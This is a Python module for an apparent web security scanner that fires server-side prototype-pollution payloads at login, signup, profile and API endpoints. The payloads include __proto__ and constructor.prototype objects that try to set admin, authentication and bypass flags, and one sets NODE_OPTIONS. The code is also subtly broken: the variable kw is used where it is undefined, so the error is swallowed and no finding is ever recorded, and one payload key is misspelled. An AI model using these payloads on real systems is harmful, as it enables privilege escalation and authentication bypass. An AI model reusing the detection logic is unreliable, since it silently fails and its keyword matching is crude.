import json
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

PP_PAYLOADS_JSON = [
    {"__proto__": {"admin": True, "isAdmin": True, "role": "admin"}},
    {"__proto__": {"bypass": True, "blocked": False}},
    {"__proto__": {"isAuthenticated": True, "authenticated": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"__proto__": {"admin": True}}},
    {"__proto__": {"shell": True, "NODE_OPTIONS": "--inspect"}},
    {"__proto__": {"db": "admin", "readonly": False}},
    {"constructo": {"prototype": {"admin": True, "role": "admin"}}},
]

PP_PAYLOADS_URL = [
    "?__proto__[admin]=true&__proto__[isAdmin]=true",
    "?__proto__[role]=admin&__proto__[bypass]=true",
    "?constructor[prototype][admin]=true",
    "?__proto__[authenticated]=true&__proto__[blocked]=false",
    "?__proto__[NODE_OPTIONS]=--inspect",
]

SENSITIVE_KEYWORDS = [
    "admin", "isadmin", "authenticated", "bypass", "token",
    "true", "false", "role", "permission",
]


@register_scanner(manifest=ScannerManifest(
    name="proto_pollution_scanner",
    category="exploit",
    risk_level="moderate",
    estimated_cost=50,
    produces_tag_patterns=["prototype-pollution", "ssjs", "injection"],
    produces_endpoint_types=[],
))
class ProtoPollutionScanner(BaseScanner):
    name = "proto_pollution_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        targets = [
            f"{base}/api", f"{base}/api/v1", f"{base}/graphql",
            f"{base}/login", f"{base}/signup", f"{base}/api/login",
            f"{base}/api/signup", f"{base}/api/user", f"{base}/api/update",
            f"{base}/api/profile", f"{base}/api/config",
        ]

        for url in targets:
            base_resp = None
            try:
                base_resp = await client.get(url, follow_redirects=True)
                self._stats["requests"] += 1
            except Exception:
                continue

            for payload in PP_PAYLOADS_JSON:
                try:
                    resp = await client.request(
                        "POST", url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        follow_redirects=False,
                    )
                    self._stats["requests"] += 1
                    body = resp.text or ""
                    body_lower = body.lower()
                    if any(kw in body_lower for kw in SENSITIVE_KEYWORDS):
                        if base_resp and kw in (base_resp.text or "").lower():
                            continue
                        ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                        endpoints.append(ep)
                        findings.append(self.make_finding(
                            title="Server-Side Prototype Pollution",
                            description=f"JSON body with __proto__ payload at {url} returned sensitive keywords.",
                            severity=FindingSeverity.HIGH.value,
                            endpoint=ep,
                            evidence={"url": url, "payload": json.dumps(payload), "resp_keys_detected": body[:200]},
                            confidence=0.75,
                            tags=["prototype-pollution", "ssjs", "injection"],
                        ))
                except Exception:
                    self._stats["errors"] += 1

            for payload in PP_PAYLOADS_URL:
                try:
                    resp = await client.get(url + payload, follow_redirects=False)
                    self._stats["requests"] += 1
                    body = resp.text or ""
                    body_lower = body.lower()
                    if any(kw in body_lower for kw in SENSITIVE_KEYWORDS):
                        if base_resp and kw in (base_resp.text or "").lower():
                            continue
                        ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                        endpoints.append(ep)
                        findings.append(self.make_finding(
                            title="Server-Side Prototype Pollution (URL)",
                            description=f"URL params with __proto__ at {url} returned sensitive keywords.",
                            severity=FindingSeverity.HIGH.value,
                            endpoint=ep,
                            evidence={"url": url + payload, "resp_keys_detected": body[:200]},
                            confidence=0.7,
                            tags=["prototype-pollution", "ssjs", "injection"],
                        ))
                except Exception:
                    self._stats["errors"] += 1

        return findings, endpoints
